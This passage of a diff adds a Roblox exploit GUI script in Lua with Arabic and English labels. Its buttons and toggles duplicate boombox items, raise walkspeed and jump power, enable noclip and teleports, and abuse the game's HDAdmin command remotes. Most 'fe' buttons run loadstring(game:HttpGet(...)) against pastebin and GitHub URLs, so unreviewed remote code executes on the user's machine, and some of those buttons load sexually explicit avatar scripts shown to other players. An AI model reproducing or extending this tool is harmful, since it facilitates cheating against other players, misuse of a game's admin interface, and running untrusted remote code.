+   RemoveTextAfterFocusLost = true,
+   Callback = function(amount)
+    if amount == "" then
+    return end
+        if tonumber(amount) then
+            GUI:Notify({
+                Title = "Note",
+                Content = "Duping "..amount.." Boombox's",
+                Duration = 5.2,
+            })
+            Dupe(amount)
+        end
+   end,
+})
+
+local Button = home:CreateButton({
+Name = "Remove Boombox Mesh / راديو حجر",
+Callback = function()
+    Mesh()
+    GUI:Notify({
+        Title= "",
+        Content = "Removed..",
+        Duration = 5.2,
+    })
+end,
+})
+
+local Button = home:CreateButton({
+    Name = "invisble boombox / راديو مخفي",
+    Callback = function()
+        invisb()
+        GUI:Notify({
+            Title= "",
+            Content = "invisble..",
+            Duration = 5.2,
+        })
+    end,
+    })
+
+local Button = home:CreateButton({
+Name = "Remove the Dance Tools / ازاله الرقصات",
+Callback = function()
+GUI:Notify({
+    Title= "Note",
+    Content = "If it glows red then you don't have dance tools dumby",
+    Duration = 5.2,
+})
+plr.Backpack:FindFirstChild("رقصة 1").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 2").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 3").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 4").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 5").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 6").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 7").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 8").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 9").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 01").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 11").Name = "قص"
+plr.Backpack:FindFirstChild("رقصة 21").Name = "قص"
+for i,v in pairs(plr.Backpack:GetDescendants()) do
+    if v.Name ==  "قص" then
+        v:Destroy()
+    end
+end
+end
+})
+
+local Toggle = home:CreateToggle({
+Name = "Auto remove dance tools / ازاله الرقصات تلقائي",
+CurrentValue = false,
+Flag = "ardt", 
+Callback = function(ardt)
+    if ardt == true then
+        _G.autr = true
+        GUI:Notify({
+            Title= "Toggle",
+            Content = "Auto remove dance tools is Active (reset to take effect)",
+            Duration = 5.2,
+        })
+        while _G.autr == true do
+        if plr.CharacterAdded:wait() then
+        plr.Backpack:FindFirstChild("رقصة 1").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 2").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 3").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 4").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 5").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 6").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 7").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 8").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 9").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 01").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 11").Name = "قص"
+        plr.Backpack:FindFirstChild("رقصة 21").Name = "قص"
+        for i,v in pairs(plr.Backpack:GetDescendants()) do
+            if v.Name ==  "قص" then
+                v:Destroy()
+            end
+        end
+    end
+    end
+else
+    GUI:Notify({
+         Title= "Toggle",
+        Content = "Auto remove dance tools is Disblade..",
+        Duration = 5.2,
+    })
+    _G.autr = false
+end
+end,
+})
+
+local Dropdown = home:CreateDropdown({
+    Name = "BOOMBOX Grip Pos / اشكال راديو",
+    Options = {"AK / رشاش","pc / بيسي","railgun / ريلقن","railgun V2 / ريلقن الاصدار الثاني","pickaxe / بيك اكس","RPG / ار بي جي","sword / سيف","phone / جوال","boomboxarm / يد الراديو"},
+    CurrentOption = "Select Pos",
+    Callback = function(slc)
+        if slc == "AK / رشاش" then
+            AK()
+        elseif slc == "railgun / ريلقن" then
+            RAILGUNV1()
+        elseif slc == "railgun V2 / ريلقن الاصدار الثاني" then
+            RAILGUNV2()
+        elseif slc == "pickaxe / بيك اكس" then
+            PICKAXE()
+        elseif slc == "RPG / ار بي جي" then
+            RPG()
+        elseif slc == "sword / سيف" then
+            SWORD()
+        elseif slc == "phone / جوال" then
+            PHONE()
+        elseif slc == "boomboxarm / يد الراديو" then
+            BOOMBOXARM()
+        elseif slc == "pc / بيسي" then
+            pc()
+        end
+    end,
+})
+
+local LP =  UI:CreateTab("LocalPlayer", 12210509547)
+
+
+local Section = LP:CreateSection("aka localplayer")
+
+
+
+local Slider = LP:CreateSlider({
+    Name = "walkspeed / سرعه الشخصيه",
+    Range = {16, 500},
+    Increment = 1,
+    CurrentValue = 16,
+    Flag = "ws",
+    Callback = function(value)
+        plr.Character.Humanoid.WalkSpeed = value
+    end,
+})
+
+local Slider = LP:CreateSlider({
+    Name = "Jump Power / قوه القفز",
+    Range = {50, 1000},
+    Increment = 1,
+    CurrentValue = 50,
+    Flag = "jp", 
+    Callback = function(value)
+        plr.Character.Humanoid.JumpPower = value
+    end,
+})
+
+
+local flyjump 
+wait()
+local Toggle = LP:CreateToggle({
+    Name = "flyjump / قفز لانهائي",
+    CurrentValue = false,
+    Flag = "fj", 
+    Callback = function(infjump)
+        if infjump == true then
+            GUI:Notify({
+                 Title= "Toggle",
+                Content = "Infjump is Active!",
+                Duration = 5.2,
+            })
+        if flyjump then flyjump:Disconnect() end
+        flyjump = UserInputService.JumpRequest:Connect(function(Jump)
+            Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
+        end)
+    else
+        GUI:Notify({
+             Title= "Toggle",
+            Content = "Infjump is Disblade..",
+            Duration = 5.2,
+        })
+        if flyjump then flyjump:Disconnect() end
+    end
+    end,
+})
+
+local homeToggle2 = LP:CreateToggle({
+	Name = "Noclip / العبور بين الاشياء",
+	CurrentValue = false,
+	Flag = "nc", 
+	Callback = function(nc)
+        if nc == true then
+        Clip = false
+        wait()
+        RunService = game:GetService("RunService")
+        local Noclipping = nil
+        Clip = false
+        wait(0.1)
+        local function NoclipLoop()
+            if Clip == false and plr.Character ~= nil then
+                for _, child in pairs(plr.Character:GetDescendants()) do
+                    if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
+                        child.CanCollide = false
+                    end
+                end
+            end
+        end
+        Noclipping = RunService.Stepped:Connect(NoclipLoop)
+    else
+        Clip = true
+    end
+	end,
+})
+_G.speedConstant = 200 
+local org = nil
+local Button = LP:CreateButton({
+    Name = "Safe zone / منطقه امنه",
+    Callback = function()
+        org = plr.Character.HumanoidRootPart.CFrame
+        wait(0.05)
+        Bd()
+        local targetPos = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        local distance = (plr.Character.HumanoidRootPart.Position - targetPos.Position).Magnitude
+        local time = distance / _G.speedConstant
+
+        local tween = TweenService:Create(plr.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {
+            CFrame = targetPos
+        })
+        tween:Play()
+        plr.Character.Animate.Disabled = true
+        tween.Completed:wait()
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Animate.Disabled = false
+    end,
+})
+
+local Burrrrtton = LP:CreateButton({
+    Name = "Teleport back up / الطلوع من المنطقه الامنه",
+    Callback = function()
+            
+    Bd()
+        if org == nil then
+            local targetPos = CFrame.new(197.672119, 257.515106, -56.6765556, -0.959271967, -3.11977694e-10, 0.282484114, 8.09665182e-11, 1, 1.37935763e-09, -0.282484114, 1.34605083e-09, -0.959271967)
+            local distance = (plr.Character.HumanoidRootPart.Position - targetPos.Position).Magnitude
+            local time = distance / _G.speedConstant
+
+            local tween = TweenService:Create(plr.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {
+                CFrame = targetPos
+            })
+            tween:Play()
+            plr.Character.Animate.Disabled = true
+            tween.Completed:wait()
+            plr.Character.HumanoidRootPart.CFrame = CFrame.new(197.672119, 257.515106, -56.6765556, -0.959271967, -3.11977694e-10, 0.282484114, 8.09665182e-11, 1, 1.37935763e-09, -0.282484114, 1.34605083e-09, -0.959271967)
+            plr.Character.Animate.Disabled = false
+        else
+            local targetPos = org
+            local distance = (plr.Character.HumanoidRootPart.Position - targetPos.Position).Magnitude
+            local time = distance / _G.speedConstant
+
+            local tween = TweenService:Create(plr.Character.HumanoidRootPart, TweenInfo.new(time, Enum.EasingStyle.Linear), {
+                CFrame = targetPos
+            })
+            tween:Play()
+            plr.Character.Animate.Disabled = true
+            tween.Completed:wait()
+            plr.Character.HumanoidRootPart.CFrame = org
+            plr.Character.Animate.Disabled = false 
+        end
+    end,
+})
+
+local Slider = LP:CreateSlider({
+    Name = "tween speed / سرعه التيليبورت",
+    Range = {1, 1000},
+    Increment = 1,
+    CurrentValue = 200,
+    Flag = "twensped", 
+    Callback = function(twensped)
+        _G.speedConstant = twensped
+    end,
+})
+
+local Burrrrtton = LP:CreateButton({
+    Name = "Teleport back up (do this if you're stuck) / استخدم هاذا اذا علقت",
+    Callback = function()    
+        Bd()
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(197.672119, 257.515106, -56.6765556, -0.959271967, -3.11977694e-10, 0.282484114, 8.09665182e-11, 1, 1.37935763e-09, -0.282484114, 1.34605083e-09, -0.959271967)
+    end
+})
+
+
+
+local Section = fescripts:CreateSection("if you crashed just reset?, or rejoin in the misc tab")
+
+local Button = fescripts:CreateButton({
+    Name = "if the script is not running thin press this / استخدم هاذا اذا لم يشتغل السكربت",
+    Callback = function()    
+        Bd()
+        if _G.dont == true then
+            _G.dont = false
+            plr.Character.Humanoid.Health = 0
+            wait(0.1)
+            game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Refresh me ")
+            wait(0.8)
+            GUI:Notify({
+                 Title= "Stats",
+                Content = "Fixed! / تم التصليح",
+                Duration = 2,
+            })
+        elseif _G.dont == false then
+            GUI:Notify({
+                 Title= "Stats",
+                Content = "no problem was found / لم يتم وجود اي مشكله",
+                Duration = 5.2,
+            })
+        end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "Refresh low Chance of Crashing / ريسيت استخدم هاذا اذا ماتبي يطردك",
+    Callback = function()    
+        Bd()
+        plr.Character.Humanoid.Health = 0
+        wait(0.2)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Refresh me ")
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "fe OP SEX DOLL",
+    Callback = function()
+            
+    Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+            loadstring(game:HttpGet('https://pastebin.com/raw/mu8Sfehr'))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "PP WITH CUM",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                Title = "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+            _G.dont = false
+            GUI:Notify({
+                Title = "Note",
+                Content = "press e to cum",
+                Duration = 5.2,
+            })
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/fe%20pp%20with%20cum"))()
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "fe snake",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+            loadstring(game:HttpGet('https://pastebin.com/raw/5rSmU80M'))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "fe cat",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+            for i,v in pairs(game:GetDescendants()) do
+                if v.Name == "char2" then v:Destroy() end
+            end
+            loadstring(game:HttpGet('https://pastebin.com/raw/sqwQhwa1'))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+
+local Button = fescripts:CreateButton({
+    Name = "FE WATER SWORD",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                Title = "credits",
+                Content = "that was Made by Khlat and Makram Dacca",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump")    
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me Zeckie")
+        wait(0.5)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Hat me 7100935371")
+        wait(0.5)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Hat me 9061348537")
+        wait(0.5)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Hat me 4886277931")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+    wait(.7)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/fe%20water%20sword"))()
+    _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "FE BIG TITTY'S",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                Title = "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        local r6 = {
+            [1] = ";morph me DonaldTrump "
+        }
+        
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(r6))
+
+        wait()
+        wait(.57)
+        local clearcharappearance = {
+            [1] = ";morph me noob1 "
+        }
+        
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(clearcharappearance))
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        wait(.57)
+        local hat1 = {
+            [1] = ";hat me 4708707860 "
+        }
+        
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat1))
+        wait(.57)
+        local hat2 = {
+            [1] = ";hat me 5132802731 "
+        }
+        
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat2))
+        wait(.57)
+        local hat3 = {
+            [1] = ";hat me 12548563 "
+        }
+        
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat3))
+        wait(.57)
+        local hat4 = {
+            [1] = ";hat me 20011897 "
+        }
+        
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(hat4))
+        wait(.57)
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/BIG%20TITTY'S"))()
+        wait(0.5)
+        _G.dont = false
+        wait(.5)
+        loadstring(game:HttpGet("https://pastebin.com/raw/CQRszkzy"))()
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "Fuck That Flag",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            }) 
+            _G.dont = true
+            loadstring(game:HttpGet("https://pastebin.com/raw/f7yV09cN"))()
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "minigun",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        wait()
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCoammand:InvokeServer(";morph me noob1")
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6775268462")
+        wait(0.2)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 9063843256")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(1)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/mini%20gun"))()
+
+        GUI:Notify({
+            Title = "Note",
+            Content = "press e to equip & press q to unequip",
+            Duration = 5.2,
+        })
+    _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "Fe Sniper",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 7604332496")
+        wait(0.6)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4504231783")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(1.5)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/FE%20SNIPER23432"))()
+    _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "gaint man with gun",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 376526888")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5555280833")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4794106130")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6902333316")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 18015906")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 1744219293")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 1744235800")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 1743941933")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4585144193")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(0.7)
+    
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/fe%20gaint%20man%20with%20gun334565432q1345678432345643w2q"))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "skateboard",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5063577434")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(0.7)
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/fe%20skateboard"))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "fe 2 guns",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        wait(0.7)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4504231783")
+        wait(0.7)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 8262955749")
+        wait(0.7)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 7168000945")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(1)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/d/main/fe%202%20gun's"))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "Fe pc",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6678216978")
+        wait(0.3)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6678225898")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6531974818")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 6060224214")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5971691715")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 5205483683")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 2309346267")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(1)
+        loadstring(game:HttpGet("https://pastebin.com/raw/ChgDJkpE"))()
+        _G.dont = false
+    else
+        GUI:Notify({
+            Title = "Note",
+            Content = "a script is already running",
+            Duration = 2,
+        })
+    end
+    end,
+})
+
+local Button = fescripts:CreateButton({
+    Name = "Fe hands",
+    Callback = function()    
+        Bd()
+        if _G.dont == false then
+            _G.dont = true
+            GUI:Notify({
+                 Title= "credits",
+                Content = "that was Made by Khlat and Makram Dacca / تم صناعه السكربت من قبل مكرم وا خلاط",
+                Duration = 6.2,
+            })
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";Morph me DonaldTrump ")
+        local Pos = plr.Character.HumanoidRootPart.CFrame
+        plr.Character.HumanoidRootPart.CFrame = CFrame.new(186.28096, 237.706467, -47.1299744, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+        plr.Character.Humanoid.WalkSpeed = 0
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";morph me noob1")
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";char ")
+        wait(0.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 4855525473")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 8337370")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 48474313")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 48474294")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 451220849")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 62724852")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 20372960")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 63690008")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 62234425")
+        wait(1.25)
+        game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(";hat me 376524487")
+        plr.Character.HumanoidRootPart.CFrame = Pos
+        plr.Character.Humanoid.WalkSpeed = 20
+        wait(0.7)
+
